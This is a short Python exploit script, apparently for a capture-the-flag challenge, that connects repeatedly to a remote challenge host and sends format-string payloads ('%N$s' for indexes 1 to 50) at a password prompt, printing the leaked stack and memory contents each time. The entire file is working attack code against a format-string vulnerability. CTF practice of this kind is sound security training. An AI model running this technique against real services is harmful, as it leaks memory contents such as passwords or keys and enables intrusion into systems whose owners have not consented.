from pwnie import *  

context.log_level = 'error'

for i in range(1, 51):
    try:
        p = remote('challenge.ctf.ehc-fptu.club', 37918)
        p.sendlineafter(b'password:', f'%{i}$s'.encode())
        p.recvuntil(b'Checking your password:')
        leak = p.recvline().strip()
        print(f'Index {i} -> {leak}') 
        p.close()
    except EOFError:
        p.close()